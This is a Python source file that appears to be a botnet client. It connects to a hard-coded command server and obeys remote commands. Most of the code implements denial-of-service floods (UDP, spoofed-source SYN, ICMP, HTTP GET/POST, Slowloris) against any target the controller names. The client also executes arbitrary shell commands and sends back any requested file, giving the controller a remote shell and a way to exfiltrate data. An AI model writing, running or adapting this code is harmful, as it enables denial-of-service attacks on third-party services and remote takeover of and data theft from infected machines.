import subprocess
from tarfile import ENCODING
from threading import Thread, Timer
from time import sleep
import ctypes, socket, ssl, sys
import signal, inspect, os
import random, struct
from typing import Union, Tuple
import logging, hashlib

logging.basicConfig(level=logging.DEBUG, format="[%(asctime)s] [%(process)s] [%(levelname)s] %(message)s")
logg = logging.getLogger(__name__)

if os.name == "nt":
	ENCODING = "windows-1252"
else:
	ENCODING = "utf-8"

AUTHORIZATION = "" # (optnal) Set this to the authorization token you want to use
MAX_CHUNK_SIZE = 16 * 1024 # 16KB
POPEN_TIMEOUT = 60 # seconds

class Status:
	OK = "OK"
	FAIL = "FAIL"

class Request:
	def __init__(self, send:str="", status:str=Status.OK, body:Union[object, dict]=dict(), header:dict=dict()):
		self.header = {"status": status}

		if status == Status.FAIL:
			self.header["error"] = send

		if isinstance(body, dict):
			self.header["ct"] = "TEXT"

			if status == Status.FAIL:
				self.body = {"output": "", **body}
			else:
				self.body = {"output": send, **body}
		
		elif isinstance(body, bytes):
			self.header["ct"] = "BYTES"
			self.body = body
		
		elif isinstance(body, object):
			self.header["ct"] = "FILE"
			self.body = body

		self.header = {**self.header, **header}

	
	def __str__(self):
		return f"Request(header={self.header}, body={self.body})"
	
	def __repr__(self):
		return self.__str__()
	
	def set_header(self, key:str, value:str):
		self.header[key] = value
	
	def get_payload(self, encoding:str="utf-8") -> bytes:
		return (
			"\r\n".join(f"{key}: {value}" for key, value in self.header.items())
			+ "\r\n\r\n"
			+ "\r\n".join(f"{key}: {value}" for key, value in self.body.items())
		).encode(encoding)
	
	def __iter__(self):
		yield (
			"\r\n".join(f"{key}: {value}" for key, value in self.header.items())
			+ "\r\n\r\n"
		).encode("utf-8")

		if self.header["ct"] == "TEXT":
			yield (
				"\r\n".join(f"{key}: {value}" for key, value in self.body.items())
			).encode("utf-8")
		
		elif self.header["ct"] == "FILE":
			while data:=self.body.read(MAX_CHUNK_SIZE):
				yield data
		
		elif self.header["ct"] == "BYTES":
			yield self.body
		
		yield b'\x00\x00\xff\xff'

class Response:
	def __init__(self, payload:bytes, encoding:str="utf-8") -> None:
		if payload.endswith(b'\x00\x00\xff\xff'):
			payload = payload[:-4]

		if b"\r\n\r\n" in payload:
			self.raw_header, self.raw_body = payload.split(b"\r\n\r\n", 1)
		else:
			self.raw_header, self.raw_body = payload, b""

		self.header = {}
		self.body = {}

		for row in self.raw_header.decode(encoding, errors="ignore").split("\r\n"):
			if not row.strip(): continue
			row_split_list = list(map(lambda x: x.strip(), row.split(":")))
			self.header[row_split_list[0]] = ":".join(row_split_list[1:]) or None

		for row in self.raw_body.decode(encoding, errors="ignore").split("\r\n"):
			if not row.strip(): continue
			row_split_list = list(map(lambda x: x.strip(), row.split(":")))
			self.body[row_split_list[0]] = ":".join(row_split_list[1:]) or None
		

		self._direct = self.header["method"] == "DIRECT"
		self._connect = self.header["method"] == "CONNECT"

	def __str__(self):
		return f"Request(header={self.header}, body={self.body})"
	
	def __repr__(self):
		return self.__str__()

	@property
	def auth(self):
		return self.header.get("authorization")
	
	@property
	def cmd(self):
		return self.body.get("cmd")

	@property
	def params(self):
		return self.body.get("params")

	@property
	def ack(self):
		return self.body.get("ack")



class UDPFlood(Thread):
	def __init__(self, host:str, port:int, timeout:int, total_sent:object, run_until:object=True):
		super().__init__()
		self.host = host
		self.port = port
		self.timeout = timeout
		self.run_until = run_until
		self._closed = False

		self.total_sent_fn = total_sent
		self.total_sent = 0

		self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		self.sock.settimeout(self.timeout)

	def message(self):
		chunk = "A" * 1024
		self.total_sent_fn(len(chunk))
		self.total_sent += len(chunk)
		return chunk

	def run(self):
		while self.run_until():
			try:
				payload = self.message().encode()
				with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                    			s.sendto(payload, (self.host, self.port))
			except Exception as e:
				#pass
				print("LỖI GỬI UDP:", e)
		self.close()

	def close(self):
		self._closed = True
		try:
			self.sock.close()
		except Exception:
			pass


class SYNFlood(Thread):
	def __init__(self, host:str, port:int, timeout:int, total_sent:object, run_until:object=True):
		super().__init__()
		self.host = host
		self.port = port
		self.timeout = timeout
		self.run_until = run_until
		self._closed = False

		self.total_sent_fn = total_sent
		self.total_sent = 0

	def create_syn_packet(self, src_ip:str, dst_ip:str, src_port:int, dst_port:int) -> bytes:
		ip_ihl_ver = (4 << 4) + 5
		ip_tos = 0
		ip_tot_len = 0
		ip_id = random.randint(10000, 50000)
		ip_frag_off = 0
		ip_ttl = 255
		ip_proto = socket.IPPROTO_TCP
		ip_check = 0
		ip_saddr = socket.inet_aton(src_ip)
		ip_daddr = socket.inet_aton(dst_ip)

		ip_header = struct.pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)

		tcp_source = src_port
		tcp_dest = dst_port
		tcp_seq = random.randint(100000, 900000)
		tcp_ack_seq = 0
		tcp_doff = 5
		tcp_flags = 2 # SYN flag set
		tcp_window = socket.htons(5840)
		tcp_check = 0
		tcp_urg_ptr = 0

		tcp_offset_res = (tcp_doff << 4) + 0
		tcp_header = struct.pack('!HHLLBBHHH', tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)

		psh = struct.pack('!4s4sBBH', ip_saddr, ip_daddr, 0, socket.IPPROTO_TCP, len(tcp_header)) + tcp_header

		s = 0
		for i in range(0, len(psh) - (len(psh) % 2), 2):
			w = (psh[i] << 8) + (psh[i+1])
			s += w
		if len(psh) % 2 != 0:
			s += (psh[-1] << 8)
		s = (s >> 16) + (s & 0xffff)
		s += (s >> 16)
		tcp_check = ~s & 0xffff

		tcp_header = struct.pack('!HHLLBBH', tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags, tcp_window) + struct.pack('H', tcp_check) + struct.pack('!H', tcp_urg_ptr)

		return ip_header + tcp_header

	def run(self):
		use_raw = True
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
		except Exception as e:
			use_raw = False
			logg.warning(f"[SYN] Raw socket creation failed ({e}). Falling back to TCP Connect Flood.")

		while self.run_until():
			if use_raw:
				try:
					#src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
					src_ip = "172.10.10.11"
					src_port = random.randint(1024, 65535)
					packet = self.create_syn_packet(src_ip, self.host, src_port, self.port)
					s.sendto(packet, (self.host, self.port))
					self.total_sent_fn(len(packet))
					self.total_sent += len(packet)
				except Exception:
					use_raw = False
			else:
				try:
					sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					sock.settimeout(1)
					sock.connect_ex((self.host, self.port))
					sock.close()
					self.total_sent_fn(1)
					self.total_sent += 1
				except Exception:
					pass
		if use_raw:
			try:
				s.close()
			except Exception:
				pass


class ICMPFlood(Thread):
	def __init__(self, host:str, port:int, timeout:int, total_sent:object, run_until:object=True):
		super().__init__()
		self.host = host
		self.timeout = timeout
		self.run_until = run_until
		self.total_sent_fn = total_sent
		self.total_sent = 0

	def checksum(self, msg: bytes) -> int:
		s = 0
		for i in range(0, len(msg) - (len(msg) % 2), 2):
			w = (msg[i] << 8) + (msg[i+1])
			s += w
		if len(msg) % 2 != 0:
			s += (msg[-1] << 8)
		s = (s >> 16) + (s & 0xffff)
		s += (s >> 16)
		return ~s & 0xffff

	def create_icmp_packet(self) -> bytes:
		packet_id = random.randint(1000, 65535) & 0xFFFF
		header = struct.pack('!BBHHH', 8, 0, 0, packet_id, 1)
		data = b'P' * 64
		chksum = self.checksum(header + data)
		header = struct.pack('!BBHHH', 8, 0, socket.htons(chksum), packet_id, 1)
		return header + data

	def run(self):
		use_raw = True
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
		except Exception as e:
			use_raw = False
			logg.warning(f"[ICMP] Raw socket creation failed ({e}). Falling back to UDP ICMP Flood.")

		if not use_raw:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

		while self.run_until():
			try:
				if use_raw:
					packet = self.create_icmp_packet()
					s.sendto(packet, (self.host, 1))
					self.total_sent_fn(len(packet))
					self.total_sent += len(packet)
				else:
					packet = b'X' * 64
					s.sendto(packet, (self.host, 1))
					self.total_sent_fn(len(packet))
					self.total_sent += len(packet)
			except Exception:
				pass
		try:
			s.close()
		except Exception:
			pass


class HTTPGetFlood(Thread):
	REQUESTS_PER_CONN = 100  # Số request gửi trên mỗi kết nối (giống ab)

	def __init__(self, host:str, port:int, timeout:int, total_sent:object, run_until:object=True):
		super().__init__()
		self.host = host
		self.port = port if port else 80
		self.use_ssl = (self.port == 443)
		self.timeout = timeout
		self.run_until = run_until
		self.total_sent_fn = total_sent
		self.total_sent = 0
		self.user_agents = [
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
			"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
			"Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
			"Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/115.0",
		]
		# SSL context dùng chung cho tất cả kết nối trong thread này
		if self.use_ssl:
			self._ssl_ctx = ssl.create_default_context()
			self._ssl_ctx.check_hostname = False
			self._ssl_ctx.verify_mode = ssl.CERT_NONE  # Bỏ qua self-signed cert

	def _make_socket(self):
		"""Tạo và kết nối socket, tự động wrap SSL nếu cần."""
		raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		raw.settimeout(5)
		raw.connect((self.host, self.port))
		if self.use_ssl:
			return self._ssl_ctx.wrap_socket(raw, server_hostname=self.host)
		return raw

	def run(self):
		while self.run_until():
			s = None
			try:
				s = self._make_socket()
				ua = random.choice(self.user_agents)
				# Gửi nhiều request trên cùng 1 kết nối (Keep-Alive, giống ab)
				for _ in range(self.REQUESTS_PER_CONN):
					if not self.run_until():
						break
					req = (
						f"GET /?r={random.randint(1, 999999)} HTTP/1.1\r\n"
						f"Host: {self.host}\r\n"
						f"User-Agent: {ua}\r\n"
						f"Accept: text/html,application/xhtml+xml,*/*\r\n"
						f"Accept-Language: en-US,en;q=0.9\r\n"
						f"Accept-Encoding: gzip, deflate, br\r\n"
						f"Connection: keep-alive\r\n\r\n"
					)
					s.sendall(req.encode())
					self.total_sent_fn(len(req))
					self.total_sent += len(req)
					# Đọc response để giải phóng buffer server (như ab làm)
					try:
						s.recv(4096)
					except Exception:
						break
			except Exception:
				pass
			finally:
				if s:
					try:
						s.close()
					except Exception:
						pass


class HTTPPostFlood(Thread):
	REQUESTS_PER_CONN = 50  # Số POST gửi trên mỗi kết nối (Keep-Alive)

	def __init__(self, host:str, port:int, timeout:int, total_sent:object, run_until:object=True):
		super().__init__()
		self.host = host
		self.port = port if port else 80
		self.use_ssl = (self.port == 443)
		self.timeout = timeout
		self.run_until = run_until
		self.total_sent_fn = total_sent
		self.total_sent = 0
		# SSL context dùng chung cho tất cả kết nối trong thread này
		if self.use_ssl:
			self._ssl_ctx = ssl.create_default_context()
			self._ssl_ctx.check_hostname = False
			self._ssl_ctx.verify_mode = ssl.CERT_NONE  # Bỏ qua self-signed cert

	def _make_socket(self):
		"""Tạo và kết nối socket, tự động wrap SSL nếu cần."""
		raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		raw.settimeout(5)
		raw.connect((self.host, self.port))
		if self.use_ssl:
			return self._ssl_ctx.wrap_socket(raw, server_hostname=self.host)
		return raw

	def run(self):
		while self.run_until():
			s = None
			try:
				s = self._make_socket()
				body = "payload=" + ("A" * 1024)
				# Gửi nhiều POST trên cùng 1 kết nối (Keep-Alive, ít SYN hơn)
				for _ in range(self.REQUESTS_PER_CONN):
					if not self.run_until():
						break
					req = (
						f"POST /?r={random.randint(1, 999999)} HTTP/1.1\r\n"
						f"Host: {self.host}\r\n"
						f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
						f"Content-Type: application/x-www-form-urlencoded\r\n"
						f"Content-Length: {len(body)}\r\n"
						f"Accept: */*\r\n"
						f"Connection: keep-alive\r\n\r\n"
						f"{body}"
					)
					s.sendall(req.encode())
					self.total_sent_fn(len(req))
					self.total_sent += len(req)
					# Đọc response để giải phóng buffer server
					try:
						s.recv(4096)
					except Exception:
						break
			except Exception:
				pass
			finally:
				if s:
					try:
						s.close()
					except Exception:
						pass


class SlowlorisFlood(Thread):
	def __init__(self, host:str, port:int, timeout:int, total_sent:object, run_until:object=True):
		super().__init__()
		self.host = host
		self.port = port if port else 80
		self.timeout = timeout
		self.run_until = run_until
		self.total_sent_fn = total_sent
		self.total_sent = 0

	def run(self):
		sockets = []
		for _ in range(30):
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.settimeout(4)
				s.connect((self.host, self.port))
				req = f"GET /?{random.randint(0, 5000)} HTTP/1.1\r\nHost: {self.host}\r\nUser-Agent: Mozilla/5.0\r\nAccept-language: en-US,en,q=0.5\r\n"
				s.send(req.encode())
				sockets.append(s)
			except Exception:
				pass

		while self.run_until():
			for s in list(sockets):
				try:
					header = f"X-a: {random.randint(1, 5000)}\r\n"
					s.send(header.encode())
					self.total_sent_fn(len(header))
					self.total_sent += len(header)
				except Exception:
					sockets.remove(s)
					try:
						new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						new_s.settimeout(4)
						new_s.connect((self.host, self.port))
						req = f"GET /?{random.randint(0, 5000)} HTTP/1.1\r\nHost: {self.host}\r\nUser-Agent: Mozilla/5.0\r\nAccept-language: en-US,en,q=0.5\r\n"
						new_s.send(req.encode())
						sockets.append(new_s)
					except Exception:
						pass
			sleep(5)

		for s in sockets:
			try:
				s.close()
			except Exception:
				pass


class AttackManager(Thread):
	def __init__(self, parent:object, method:str, host:str, port:int, timeout:int, max_threads:int, hash:str):
		super().__init__()
		self.parent = parent
		self.method = method.upper()
		try:
			self.host = socket.gethostbyname(host)
		except Exception:
			self.host = host
		self.port = port
		self.timeout = timeout
		self.max_threads = max_threads

		self.task_hash = hash
		self.run_until_local = True
		self._closed = False

		self.threads = []
		self.total_sent = 0

	def run_until_fn(self):
		if not self.run_until_local:
			return self.run_until_local
		
		if not self.parent.tasks.get(self.task_hash):
			return False

		return self.parent.tasks[self.task_hash].get("run")

	def update_data(self, n:int):
		self.total_sent += n

	def get_attack_class(self):
		mapping = {
			"UDP": UDPFlood,
			"SYN": SYNFlood,
			"ICMP": ICMPFlood,
			"HTTP": HTTPGetFlood,
			"HTTP_GET": HTTPGetFlood,
			"POST": HTTPPostFlood,
			"HTTP_POST": HTTPPostFlood,
			"SLOWLORIS": SlowlorisFlood,
		}
		return mapping.get(self.method, UDPFlood)

	def run(self):
		logg.debug(f"Starting AttackManager ({self.method}) for {self.host}:{self.port}")
		attack_cls = self.get_attack_class()
		for _ in range(self.max_threads):
			thread = attack_cls(self.host, self.port, self.timeout, self.update_data, self.run_until_fn)
			thread.start()
			self.threads.append(thread)

		current_loop = 0
		sleep_duration = 0.01
		max_loop = self.timeout / sleep_duration

		while current_loop <= max_loop:
			if not self.run_until_local:
				logg.debug(f"Stopping AttackManager ({self.method})")
				break
			sleep(sleep_duration)
			current_loop += 1

		self.close()

	def close(self):
		logg.debug(f"Closing AttackManager ({self.method})")
		self._closed = True
		self.parent.tasks.pop(self.task_hash, None)


UDPFloodManager = AttackManager


class Client():
	def __init__(self, addr:Tuple[str,int]=("172.10.10.10",8080)) -> None:
		signal.signal(signal.SIGINT, self.exit_gracefully)
		signal.signal(signal.SIGTERM, self.exit_gracefully)
		self.stop = False
		self.run = False


		self.tasks = {}

		self.direct = direct = {}
		for attr, func in inspect.getmembers(self):
			if attr.startswith("direct_"):
				direct[attr[7:].upper()] = func
		
		self.connect = connect = {}
		for attr, func in inspect.getmembers(self):
			if attr.startswith("connect_"):
				connect[attr[8:].upper()] = func


		while not self.stop:
			try:
				self._connect(addr)
			except KeyboardInterrupt:
				continue
			except Exception as ex:
				# trace = []
				# tb = ex.__traceback__
				# while tb is not None:
				# 	trace.append({
				# 		"filename": tb.tb_frame.f_code.co_filename,
				# 		"name": tb.tb_frame.f_code.co_name,
				# 		"lineno": tb.tb_lineno
				# 	})
				# 	tb = tb.tb_next
				# print(str({
				# 	'type': type(ex).__name__,
				# 	'message': str(ex)
				# }))

				# for n in trace:
				# 	print(n)

				print(f"Error connecting {addr}| Sleep 0 seconds")
				sleep(0)


		# self._connect(addr)
		# input("Press enter to exit")



	def exit_gracefully(self, signum, frame):
		print("\nExiting....")
		self.stop = True
		self.run = False
		self.conn.close()
		sleep(1)
		sys.exit(0)

	def _connect(self, connect:Tuple[str,int]) -> None:
		self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.conn.connect(connect)
		self.start()

	def send(self, req:Request) -> None:
		for payload in req:
			self.conn.send(payload)


	def recv(self) -> Response:
		data = self.conn.recv(MAX_CHUNK_SIZE)
		if not data:
			return None

		res = Response(data)

		return res

	def start(self) -> None:
		while True:
			response = self.recv()

			cmd = response.cmd
			ack = response.cmd
			params = response.params.split(" ") if response.params else response.params

			if response._direct:
				self.method_direct(cmd, ack, params)
			
			elif response._connect:
				self.method_connect(cmd, ack, params)

			else:
				print("Invalid command")
	

	def method_direct(self, cmd:str, ack:str, params:str) -> None:
		if cmd in self.direct:
			self.direct[cmd](ack, params)
		else:
			print("Invalid command")
	
	def direct_attack(self, ack:str, params:str) -> None:
		if isinstance(params, list) and len(params) == 5:
			method, host, port, timeout, threads = params
		elif isinstance(params, list) and len(params) == 4:
			method = "UDP"
			host, port, timeout, threads = params
		else:
			if ack:
				self.send(Request("Invalid attack parameters", status=Status.FAIL))
			return

		try:
			resolved_host = socket.gethostbyname(host)
		except Exception:
			resolved_host = host

		port = int(port)
		timeout = int(timeout)
		threads = int(threads)

		hash = self.get_hash("ATTACK", params)

		self.tasks[hash] = dict(run=True)

		manager = AttackManager(self, method, resolved_host, port, timeout, threads, hash)
		manager.start()

		self.tasks[hash]["manager"] = manager

		if ack:
			self.send(Request(f"Task started successfully {hash} [{method.upper()}] -> {resolved_host}"))
	
	def direct_ping(self, ack:str, params:str) -> None:
		if ack:
			self.send(Request("Pong"))
	
	def direct_kill(self, ack:str, params:str) -> None:
		hash = int(params[0])
		if hash in self.tasks:
			self.tasks[hash]["manager"].run_until_local = False
			if ack:
				self.send(Request("Task killed successfully {}".format(hash)))
		else:
			if ack:
				self.send(Request("Task not found {}".format(hash)))
	
	def direct_stop(self, ack:str, params:str) -> None:
		for hash in self.tasks:
			self.tasks[hash]["manager"].run_until_local = False
		
		if ack:
			self.send(Request("All tasks killed successfully"))

	def direct_destroy(self, ack:str, params:str) -> None:
		for hash in self.tasks:
			self.tasks[hash]["manager"].run_until_local = False
		if ack:
			self.send(Request("Shutting down"))
		
		self.exit_gracefully(None, None)

	def method_connect(self, cmd:str, ack:str, params:str) -> None:
		if cmd in self.connect:
			self.connect[cmd](ack, params)
		else:
			self.send(Request("Invalid command"))
	
	def connect_shell(self, ack:str, params:str) -> None:
		output = self.popen(cmd=params)
		if ack:
			self.send(Request(body=output))

	def connect_download(self, ack:str, params:str) -> None:
		file = params[0]
		if os.path.exists(file):
			with open(file, "rb") as fp:
				self.send(Request(body=fp))
				return

		self.send(Request(f"File {file} Not found.", status=Status.FAIL))

	

	def popen(self, cmd: list) -> str:
		process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
		timer = Timer(POPEN_TIMEOUT, process.terminate)
		try:
			timer.start()
			stdout, stderr = process.communicate()
			output = stdout or stderr
		finally:
			timer.cancel()

		final_output = output.replace(b"\r\n", b"\n").decode(encoding="windows-1252").encode()
		return final_output

	def get_hash(self, *args):
		data = []
		if len(args) > 1:
			for n in args:
				if isinstance(n, str):
					data.append(n)

				if isinstance(n, (tuple, list, set)):
					data += [*list(n)]
		else:
			data = args

		he = hashlib.md5(str(data).encode()).hexdigest()
		return (int(he, 16) % (1<<32))




if __name__ == "__main__":
	Client()
